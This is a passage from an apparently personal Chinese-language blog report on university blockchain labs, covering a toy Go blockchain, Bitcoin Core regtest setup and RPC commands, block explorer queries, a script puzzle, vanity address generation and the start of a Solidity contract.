<span class="keyword">return</span> &amp;bc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">blockchain_db_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	bc := NewBlockchain_in_db()</span><br><span class="line">	bc.AddBlock(<span class="string">&quot;Send 1 BTC to Ivan&quot;</span>)</span><br><span class="line">	bc.AddBlock(<span class="string">&quot;Send 2 more BTC to Ivan&quot;</span>)</span><br><span class="line">	bci := bc.Iterator()</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		block := bci.Next()</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Prev. hash: %x\n&quot;</span>, block.PrevHash)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Data: %s\n&quot;</span>, block.Data)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Hash: %x\n&quot;</span>, block.Hash)</span><br><span class="line">		pow := NewProofOfWork(block)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;PoW: %s\n&quot;</span>, strconv.FormatBool(pow.Validate()))</span><br><span class="line">		fmt.Println()</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(block.PrevHash) == <span class="number">0</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">list_blocks</span><span class="params">()</span></span> &#123;</span><br><span class="line">	bc := NewBlockchain_in_db()</span><br><span class="line">	bci := bc.Iterator()</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		block := bci.Next()</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Prev. hash: %x\n&quot;</span>, block.PrevHash)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Data: %s\n&quot;</span>, block.Data)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Hash: %x\n&quot;</span>, block.Hash)</span><br><span class="line">		pow := NewProofOfWork(block)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;PoW: %s\n&quot;</span>, strconv.FormatBool(pow.Validate()))</span><br><span class="line">		fmt.Println()</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(block.PrevHash) == <span class="number">0</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(data <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	bc := NewBlockchain_in_db()</span><br><span class="line">	bc.AddBlock(data)</span><br><span class="line">	fmt.Print(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cli_mode</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	foostr := flag.NewFlagSet(<span class="string">&quot;newblock&quot;</span>,flag.ExitOnError)</span><br><span class="line">	strValue := foostr.String(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;string&quot;</span>,<span class="string">&quot;打印字符串&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> os.Args[<span class="number">1</span>] &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;newblock&quot;</span>:</span><br><span class="line">		foostr.Parse(os.Args[<span class="number">2</span>:])</span><br><span class="line">		Add(*strValue)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;listblocks&quot;</span>:</span><br><span class="line">		list_blocks()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;expected &#x27;str&#x27; subcommands&quot;</span>)</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实验截图：</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102111924062.png" alt="image-20211102111924062"></p>
<p>添加区块。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102112149554.png" alt="image-20211102112149554"></p>
<p>可以看到区块已经被成功添加进来。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102112214484.png" alt="image-20211102112214484"></p>
<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><p>本周开始好像就和GO语言没啥关系了，开始realworld。</p>
<p>但也因为个人原因，开始摆烂了，懒得做选做了。</p>
<h2 id="实验一-熟悉-Bitcoin-Core-的基本配置方法"><a href="#实验一-熟悉-Bitcoin-Core-的基本配置方法" class="headerlink" title="实验一  熟悉 Bitcoin Core 的基本配置方法"></a>实验一  熟悉 Bitcoin Core 的基本配置方法</h2><p>在Linux上安装Bitcoincore15版本，这里不推荐最新的版本，据说删除了很多对新手友好的指令。</p>
<p>虽然指导书上给的windows安装包，但我怕把windows装炸了，于是装在虚拟机里了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /wallet</span><br><span class="line">cd /wallet</span><br><span class="line">wget https://bitcoincore.org/bin/bitcoin-core-0.15.2/bitcoin-0.15.2-x86_64-linux-gnu.tar.gz</span><br><span class="line">cd bitcoin-0.15.2/bin</span><br><span class="line">ln -s /wallet/bitcoin-0.15.2/bin/bitcoind /usr/bin/bitcoind</span><br><span class="line">ln -s /wallet/bitcoin-0.15.2/bin/bitcoin-cli /usr/bin/bitcoin-cli</span><br></pre></td></tr></table></figure>
<p>成功安装好。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102165202133.png" alt="image-20211102165202133"></p>
<p>在<code>/root/.bitcoin</code>为默认存储数据位置，我们查看文件夹如下。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102173125963.png" alt="image-20211102173125963"><br><code>bitcoin.conf</code>内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir=/wallet/datadir</span><br><span class="line">regtest=1</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102193032479.png" alt="image-20211102193032479"></p>
<p>最终配置的三个<code>.conf</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regtest=1</span><br><span class="line">port=22222</span><br><span class="line">rpcport=18332</span><br><span class="line">addnode=127.0.0.1:22224</span><br><span class="line">addnode=127.0.0.1:22226</span><br><span class="line"></span><br><span class="line">rpcuser=alice</span><br><span class="line"></span><br><span class="line"># rpc访问的password</span><br><span class="line">rpcpassword=8PPL3gL3gAM967mies3E=  #设置rpc接口的访问密码</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regtest=1</span><br><span class="line">port=22224</span><br><span class="line">rpcport=18334</span><br><span class="line">addnode=127.0.0.1:22222</span><br><span class="line">addnode=127.0.0.1:22226 </span><br><span class="line"></span><br><span class="line">rpcuser=bob</span><br><span class="line"></span><br><span class="line"># rpc访问的password</span><br><span class="line">rpcpassword=8PPL3gL3gAM967mies3E=  #设置rpc接口的访问密码</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regtest=1</span><br><span class="line">port=22226</span><br><span class="line">rpcport=18336</span><br><span class="line">addnode=127.0.0.1:22222</span><br><span class="line">addnode=127.0.0.1:22224</span><br><span class="line"></span><br><span class="line">rpcuser=network</span><br><span class="line"></span><br><span class="line">rpcpassword=8PPL3gL3gAM967mies3E=  #设置rpc接口的访问密码</span><br></pre></td></tr></table></figure>
<p>同时运行三个终端后，我们查看<code>debug.log</code>，可以看到一些信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2021-11-02 09:14:04 * Using 2.0MiB for block index database</span><br><span class="line">2021-11-02 09:14:04 * Using 8.0MiB for chain state database</span><br><span class="line">2021-11-02 09:14:04 * Using 440.0MiB for in-memory UTXO set (plus up to 286.1MiB of unused mempool space)</span><br><span class="line">2021-11-02 09:14:04 init message: Loading block index...</span><br><span class="line">2021-11-02 09:14:04 Opening LevelDB in /root/.bitcoin/regtest/blocks/index</span><br><span class="line">2021-11-02 09:14:04 Opened LevelDB successfully</span><br><span class="line">2021-11-02 09:14:04 Using obfuscation key for /root/.bitcoin/regtest/blocks/index: 0000000000000000</span><br><span class="line">2021-11-02 09:14:04 LoadBlockIndexDB: last block file = 0</span><br><span class="line">2021-11-02 09:14:04 LoadBlockIndexDB: last block file info: CBlockFileInfo(blocks=1, size=293, heights=0...0, time=2011-02-02...2011-02-02)</span><br><span class="line">2021-11-02 09:14:04 Checking all blk files are present...</span><br><span class="line">2021-11-02 09:14:04 LoadBlockIndexDB: transaction index disabled</span><br><span class="line">2021-11-02 09:14:04 Opening LevelDB in /root/.bitcoin/regtest/chainstate</span><br><span class="line">2021-11-02 09:14:04 Opened LevelDB successfully</span><br><span class="line">2021-11-02 09:14:04 Using obfuscation key for /root/.bitcoin/regtest/chainstate: 3ee9ed6c7b1f986a</span><br><span class="line">2021-11-02 09:14:04 Loaded best chain: hashBestChain=0f9188f13cb7b2c71f2a335e3a4fc328bf5beb436012afca590b1a11466e2206 height=0 date=2011-02-02 23:16:42 progress=1.000000</span><br><span class="line">2021-11-02 09:14:04 init message: Rewinding blocks...</span><br><span class="line">2021-11-02 09:14:04 init message: Verifying blocks...</span><br><span class="line">2021-11-02 09:14:04  block index              14ms</span><br><span class="line">2021-11-02 09:14:04 init message: Loading wallet...</span><br><span class="line">2021-11-02 09:14:04 nFileVersion = 150200</span><br><span class="line">2021-11-02 09:14:04 Keys: 2002 plaintext, 0 encrypted, 2002 w/ metadata, 2002 total</span><br><span class="line">2021-11-02 09:14:04  wallet                   25ms</span><br><span class="line">2021-11-02 09:14:04 setKeyPool.size() = 2000</span><br><span class="line">2021-11-02 09:14:04 mapWallet.size() = 0</span><br><span class="line">2021-11-02 09:14:04 mapAddressBook.size() = 1</span><br><span class="line">2021-11-02 09:14:04 mapBlockIndex.size() = 1</span><br><span class="line">2021-11-02 09:14:04 nBestHeight = 0</span><br><span class="line">2021-11-02 09:14:04 Bound to [::]:18444</span><br><span class="line">2021-11-02 09:14:04 Bound to 0.0.0.0:18444</span><br><span class="line">2021-11-02 09:14:04 init message: Loading P2P addresses...</span><br><span class="line">2021-11-02 09:14:04 Loaded 0 addresses from peers.dat  0ms</span><br><span class="line">2021-11-02 09:14:04 init message: Loading banlist...</span><br><span class="line">2021-11-02 09:14:04 init message: Starting network threads...</span><br><span class="line">2021-11-02 09:14:04 init message: Done loading</span><br><span class="line">2021-11-02 09:14:04 opencon thread start</span><br><span class="line">2021-11-02 09:14:04 msghand thread start</span><br><span class="line">2021-11-02 09:14:04 dnsseed thread start</span><br><span class="line">2021-11-02 09:14:04 Loading addresses from DNS seeds (could take a while)</span><br><span class="line">2021-11-02 09:14:04 0 addresses found from DNS seeds</span><br><span class="line">2021-11-02 09:14:04 dnsseed thread exit</span><br><span class="line">2021-11-02 09:14:04 torcontrol thread start</span><br><span class="line">2021-11-02 09:14:04 addcon thread start</span><br><span class="line">2021-11-02 09:14:04 net thread start</span><br><span class="line">2021-11-02 09:14:04 Imported mempool transactions from disk: 0 successes, 0 failed, 0 expired</span><br><span class="line">2021-11-02 09:15:05 Adding fixed seed nodes as DNS doesn&#x27;t seem to be available.</span><br></pre></td></tr></table></figure>
<p>我们可以看到：</p>
<p>存储链上交易状态初始化的数据空间为8Mib。</p>
<p>在初始化过程中，节点钱包密钥池最终保存了2000对密钥？</p>
<p>程序添加P2P的流程：在区块链中增加新的区块并与ip端口绑定，之后加载P2P地址，重建peers.dat和banlist.dat；启动网线程,完成加载,然后开启其他线程,寻找新鲜的更新信息,最后接受版本信息。</p>
<h2 id="实验二-掌握常用-RPC-指令，利用回归测试网络实现挖矿与交易"><a href="#实验二-掌握常用-RPC-指令，利用回归测试网络实现挖矿与交易" class="headerlink" title="实验二  掌握常用 RPC 指令，利用回归测试网络实现挖矿与交易"></a>实验二  掌握常用 RPC 指令，利用回归测试网络实现挖矿与交易</h2><p>利用 bitcoin-cli 指令实现简单的回归测试与网络挖矿及交易</p>
<p>由于使用的是linux，于是在<code>.bashrc</code>进行了alias配置，完成了命令的简化。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias alice-d=&#x27;bitcoind -regtest -conf=/root/.bitcoin/alice.conf -datadir=/root/.bitcoin/alice $*&#x27;</span><br><span class="line">alias bob-d=&#x27;bitcoind -regtest -datadir=/root/.bitcoin/bob $*&#x27;</span><br><span class="line">alias network-d=&#x27;bitcoind -regtest -datadir=/root/.bitcoin/network $*&#x27;</span><br><span class="line"></span><br><span class="line">alias alice-cli=&#x27;bitcoin-cli -regtest -conf=/root/.bitcoin/alice.conf -datadir=/root/.bitcoin/alice $*&#x27;</span><br><span class="line">alias bob-cli=&#x27;bitcoin-cli -regtest -conf=/root/.bitcoin/bob.conf -datadir=/root/.bitcoin/bob $*&#x27;</span><br><span class="line">alias network-cli=&#x27;bitcoin-cli -regtest -conf=/root/.bitcoin/network.conf -datadir=/root/.bitcoin/network $*&#x27;</span><br><span class="line"></span><br><span class="line">alias alice-qt=bitcoin-qt -regtest -datadir=/root/.bitcoin/alice $*</span><br><span class="line">alias bob-qt=bitcoin-qt -regtest -datadir=/root/.bitcoin/bob $*</span><br><span class="line">alias network-qt=bitcoin-qt -regtest -datadir=/root/.bitcoin/network $*</span><br></pre></td></tr></table></figure>
<p>同时运行4个终端。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211108203059756.png" alt="image-20211108203059756"></p>
<p>右边三个分别是alice,bob,network，要保证全程一直开启。</p>
<p>左侧的进程使用bitcoin-cli，先通过挖100次矿得到一笔巨款，然后分别查询network和bob的地址，然后支付给他俩，bob再挖一块获得确认，最后查看余额。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~# alice-cli listaccounts</span><br><span class="line">&#123;</span><br><span class="line">  &quot;&quot;: 8750.00000000</span><br><span class="line">&#125;</span><br><span class="line">root@ubuntu:~# alice-cli getnewaddress</span><br><span class="line">mvkdP7rdB2U45R5nNJApQxfrmDrVq5HBs6</span><br><span class="line">root@ubuntu:~# bob-cli getnewaddress</span><br><span class="line">mwQ53d8PBuVTY1PQdXznnh5E8wrL2waG4o</span><br><span class="line">root@ubuntu:~# network-cli getnewaddress</span><br><span class="line">mnJVRxFTdb9dLciYDtnQMyVTQdyfEjRU5C</span><br><span class="line">root@ubuntu:~# alice-cli sendtoaddress &quot;mnJVRxFTdb9dLciYDtnQMyVTQdyfEjRU5C&quot; 1.5</span><br><span class="line">5e5a42260cd71c9113a14e7264664b3149bfd49754694a68ab4f4cc82eeab05a</span><br><span class="line">root@ubuntu:~# alice-cli sendtoaddress &quot;mwQ53d8PBuVTY1PQdXznnh5E8wrL2waG4o&quot; 2.5</span><br><span class="line">0eaeb0b8c50dbdbf305b9966a255034856e4c8cf99ca435bc1a0ac579c90582a</span><br><span class="line">root@ubuntu:~# bob-cli generate 1</span><br><span class="line">[</span><br><span class="line">  &quot;33c426060b1858bc9f96852c7898a9a7716d0548465439543d8634bca20c5e6a&quot;</span><br><span class="line">]</span><br><span class="line">root@ubuntu:~# bob-cli listaccounts</span><br><span class="line">&#123;</span><br><span class="line">  &quot;&quot;: 2.50000000</span><br><span class="line">&#125;</span><br><span class="line">root@ubuntu:~# network-cli listaccounts</span><br><span class="line">&#123;</span><br><span class="line">  &quot;&quot;: 1.50000000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211102201622520.png" alt="image-20211102201622520"></p>
<p>上述过程便是描述的全过程。</p>
<h2 id="实验三-通过控制台与测试链进行更加丰富的交互"><a href="#实验三-通过控制台与测试链进行更加丰富的交互" class="headerlink" title="实验三 通过控制台与测试链进行更加丰富的交互"></a>实验三 通过控制台与测试链进行更加丰富的交互</h2><p>bitcoin-qt就是把刚才的操作全部变成图形化操作，这里显示的是既不是alice的，也不是bob的，所以没有显示余额。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211108201423610.png" alt="image-20211108201423610"></p>
<p>在help的debug窗口里能对json进行一个解析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">decoderawtransaction</span><br><span class="line">&quot;010000000156211389e5410a9fd1fc684ea3a852b8cee07fd15398689d99441b</span><br><span class="line">98bfa76e290000000000ffffffff0280969800000000001976a914fdc79909566</span><br><span class="line">42433ea75cabdcc0a9447c5d2b4ee88acd0e89600000000001976a914d6c49205</span><br><span class="line">6f3f99692b56967a42b8ad44ce76b67a88ac00000000&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211108201816009.png" alt="image-20211108201816009"></p>
<p>可以看到，该交易的输入输出情况，输入包含交易id，交易序号，输出包含交易值，scrippubkey，有两个交易，第一个数据量大小为0.100000,另一个是0.09890000。</p>
<h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="实验一-区块链浏览器的基本操作与功能"><a href="#实验一-区块链浏览器的基本操作与功能" class="headerlink" title="实验一 区块链浏览器的基本操作与功能"></a>实验一 区块链浏览器的基本操作与功能</h2><p>前往网站<a href="https://blockstream.info/block/000000000000000003dd2fdbb484d6d9c349d644d8bbb3cbfa5e67f639a465fe，获得了如下信息：">https://blockstream.info/block/000000000000000003dd2fdbb484d6d9c349d644d8bbb3cbfa5e67f639a465fe，获得了如下信息：</a></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116232329805.png" alt="image-20211116232329805"></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116232339490.png" alt="image-20211116232339490"></p>
<p>值得我们注意的是，第二个交易里每次都是0.00001BTC，一共进行了5569次，可以发现这里面存在着很多无用的垃圾交易，算是对服务器的一个DDOS攻击（类似），体现出了区块链系统在设计方面没有考虑这种价格极小，但是靠数量堆叠上去的垃圾订单，很影响服务器运行。</p>
<p>前往<a href="https://btc.com/stats/diff">https://btc.com/stats/diff</a> ，查看比特币挖矿难度变化的可视化实时结果。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116232738221.png" alt="image-20211116232738221"></p>
<p>难度调整的间隔是：11天5小时</p>
<p>难度变化趋势：整体上难度是在增加，但是中间会有波动。</p>
<p>带来的影响：会使计算区块越来越困难</p>
<p>平均算力计算：用难度除以平均出块时间</p>
<p>调用api</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\FYHSSGSS&gt; curl https://blockstream.info/api/mempool</span><br><span class="line"></span><br><span class="line">StatusCode        : 200</span><br><span class="line">StatusDescription : OK</span><br><span class="line">Content           : &#123;&quot;count&quot;:10071,&quot;vsize&quot;:3470658,&quot;total_fee&quot;:19003372,&quot;fee_histogram&quot;:[[26.302326,50134],[12.983334,5</span><br><span class="line">                    0077],[10.573426,50207],[9.985863,79877],[8.196078,50075],[7.5089393,50009],[6.0842695,50052],[5.44</span><br><span class="line">                    14...</span><br><span class="line">RawContent        : HTTP/1.1 200 OK</span><br><span class="line">                    Vary: Accept-Encoding</span><br><span class="line">                    Access-Control-Allow-Origin: *</span><br><span class="line">                    Access-Control-Expose-Headers: x-total-results</span><br><span class="line">                    Alt-Svc: clear</span><br><span class="line">                    Content-Length: 1159</span><br><span class="line">                    Cache-Control: public, max-age=10</span><br><span class="line">                    Content...</span><br><span class="line">Forms             : &#123;&#125;</span><br><span class="line">Headers           : &#123;[Vary, Accept-Encoding], [Access-Control-Allow-Origin, *], [Access-Control-Expose-Headers, x-total</span><br><span class="line">                    -results], [Alt-Svc, clear]...&#125;</span><br><span class="line">Images            : &#123;&#125;</span><br><span class="line">InputFields       : &#123;&#125;</span><br><span class="line">Links             : &#123;&#125;</span><br><span class="line">ParsedHtml        : mshtml.HTMLDocumentClass</span><br><span class="line">RawContentLength  : 1159</span><br></pre></td></tr></table></figure>
<p>分析这个json的前一小部分即可，交易数目为10071，数据量为3470658，大约<code>3470658/1024/1024=3</code>个区块能处理这么多交易。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116233912303.png" alt="image-20211116233912303"></p>
<p>高度在9991-10000间区块内包含的总交易数目为10个。</p>
<h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><p>逐步分析：</p>
<p>初始占内有x,y,z，</p>
<p>第一步复制栈，得到<code>x,y,z,x,y,z</code><br>第二步把两个栈顶加起来<code>y+z</code>,然后pushnum9然后equal<br>得到了等式<code>y+z=9</code><br>然后类似的，每次弹两个，分别是<code>z+x=7</code>，<code>x+y=8</code><br>然后根据这三个方程解出来<code>x,y,z</code></p>
<p>即为：</p>
<script type="math/tex; mode=display">
\left\{\begin{matrix}y+z=9\\z+x=7\\x+y=8\end{matrix}\right.</script><p>解出来便可以写出解锁脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">op_pushnum_3 op_pushnum_5 op_pushnum_4</span><br></pre></td></tr></table></figure>
<h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><p>实验截图如下：</p>
<p>查看指定区块详情</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211109203257688.png" alt="image-20211109203257688"></p>
<p>探究ERC20代币合约；</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211109203331016.png" alt="image-20211109203331016"></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211109203425860.png" alt="image-20211109203425860"></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211109203645931.png" alt="image-20211109203645931"></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211109203658797.png" alt="image-20211109203658797"></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211109203714922.png" alt="image-20211109203714922"></p>
<p>智能合约定义为一段部署在evm虚拟机中的代码，无法自动执行，需要人为的 触发才能执行，每执行一次需要发起这次执行的账户扣除对应的gas作为手续费， 智能合约与平时的代码其实没有什么区别，只是运行于一个以太坊这样的分布式 平台上而已。我们将通过下周的学习了解到如何写出自己的智能合约。</p>
<h2 id="实验四-体验比特币靓号地址"><a href="#实验四-体验比特币靓号地址" class="headerlink" title="实验四 体验比特币靓号地址"></a>实验四 体验比特币靓号地址</h2><p>简单的正则。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\FYHSSGSS\Documents\University\2021autumn\blockchain\区块链实验课\实验四\实验材料\vanitygen-0.22-win&gt; .\vanitygen.exe -r &#x27;ccc&#x27;</span><br><span class="line">Pattern: ccc</span><br><span class="line">Address: 1PHtXF1YL9vTVN4FcccorAYny4q7W9Q2mT</span><br><span class="line">Privkey: 5KhRJHBQLNUjh4XGGMncydN9PaWECrMoRVFLvgmQonybbL6PFFc</span><br><span class="line">PS C:\Users\FYHSSGSS\Documents\University\2021autumn\blockchain\区块链实验课\实验四\实验材料\vanitygen-0.22-win&gt; .\vanitygen.exe -r &#x27;^11.*77$&#x27;</span><br><span class="line">Pattern: ^11.*77$</span><br><span class="line">Address: 11AXtLdPWRacsCqWbFwwUkBeuJF9DL477</span><br><span class="line">Privkey: 5JeiqauTWKDjScF5w8ycFQnULKsxhQr2wWEUmDCKKrRij4NPWGZ</span><br><span class="line">PS C:\Users\FYHSSGSS\Documents\University\2021autumn\blockchain\区块链实验课\实验四\实验材料\vanitygen-0.22-win&gt; .\vanitygen.exe -r &#x27;\d\d\d$&#x27;</span><br><span class="line">Pattern: \d\d\d$</span><br><span class="line">Address: 18ykHEtYHquacgtM2TjxPTg3MvAwebF164</span><br><span class="line">Privkey: 5KAQmGGH5xFVHvXmf8f8uKk7nmcXicqVPMie3fpD7z9VQLk2kxZ</span><br><span class="line">PS C:\Users\FYHSSGSS\Documents\University\2021autumn\blockchain\区块链实验课\实验四\实验材料\vanitygen-0.22-win&gt; .\vanitygen.exe -r &#x27;\d\d\d88$&#x27;</span><br><span class="line">Pattern: \d\d\d88$</span><br><span class="line">Address: 1KLPqwyvwuqiY7erifjjyUBrvaB1b81688</span><br><span class="line">Privkey: 5JDQjKxQ56HKkLttr4BRoDq7PdmkALGxhjKNMB4i6nyLU7wjA54</span><br></pre></td></tr></table></figure>
<h2 id="实验五-体验在线生成不同种类的钱包地址"><a href="#实验五-体验在线生成不同种类的钱包地址" class="headerlink" title="实验五 体验在线生成不同种类的钱包地址"></a>实验五 体验在线生成不同种类的钱包地址</h2><p>这里放一下实验截图就好。</p>
<h3 id="普通钱包"><a href="#普通钱包" class="headerlink" title="普通钱包"></a>普通钱包</h3><p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116230455377.png" alt="image-20211116230455377"></p>
<h3 id="纸钱包"><a href="#纸钱包" class="headerlink" title="纸钱包"></a>纸钱包</h3><p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116230430698.png" alt="image-20211116230430698"></p>
<h3 id="虚荣钱包"><a href="#虚荣钱包" class="headerlink" title="虚荣钱包"></a>虚荣钱包</h3><p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116230527645.png" alt="image-20211116230527645"></p>
<h2 id="扩展3-藏头诗："><a href="#扩展3-藏头诗：" class="headerlink" title="扩展3 藏头诗："></a>扩展3 藏头诗：</h2><p>简单的正则。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">target = <span class="string">&#x27;experience&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(target):</span><br><span class="line">    pattern = <span class="string">&#x27;^.&#123;%d&#125;%c.*$&#x27;</span> % (i + <span class="number">1</span>, c)</span><br><span class="line">    p = os.popen(<span class="string">&#x27;.\\vanitygen.exe -r &quot;%s&quot;&#x27;</span> % (pattern))</span><br><span class="line">    res = re.search(<span class="string">r&#x27;Address: (.*)&#x27;</span>, p.read())</span><br><span class="line">    <span class="built_in">print</span>(res[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116184235243.png" alt="image-20211116184235243"></p>
<h1 id="Week5"><a href="#Week5" class="headerlink" title="Week5"></a>Week5</h1><p>本周的实验内容是通过构建宠物游戏来进行智能合约编写，所用的语言是Solidity。</p>
<p>（搬一段教程的话）Solidity是一种静态类型的编程语言，用于开发在EVM上运行的智能合约。 Solidity被编译为可在EVM上运行的字节码。借由Solidity，开发人员能够编写出可自我运行其欲实现之商业逻辑的应用程序，该程序可被视为一份具权威性且永不可悔改的交易合约。对已具备程序编辑能力的人而言，编写Solidity的难易度就如同编写一般的编程语言。</p>
<p>课程团队太猛了，花了一年时间写了一个平台，非常好看！</p>
<p>在本实验中，我们选取的编译器版本是<code>0.4.26+</code></p>
<h2 id="实验一-solidity基础"><a href="#实验一-solidity基础" class="headerlink" title="实验一 solidity基础"></a>实验一 solidity基础</h2><p>按照教程一步一步写的，语法很简单，基本不用学。</p>
<p>下面的代码实现的是一个叫做Animallncubators的合约，动物有名字，还有一个独立的DNA。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.12 &lt;0.6.0;</span><br><span class="line"></span><br><span class="line">contract Animallncubators &#123;</span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaLength = 10**16;</span><br><span class="line">    struct Animal &#123;</span><br><span class="line">        uint dna;</span><br><span class="line">        string name;</span><br><span class="line">    &#125;</span><br><span class="line">    Animal[] public animals;</span><br><span class="line">    event NewAnimal(uint AnimalId, string name, uint dna);</span><br><span class="line">    function _createAnimal(string _name, uint _dna) private &#123;</span><br><span class="line">        animals.push(Animal(_dna, _name));</span><br><span class="line">        uint _animalId = animals.length - 1;</span><br><span class="line">        NewAnimal(_animalId, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line">    function 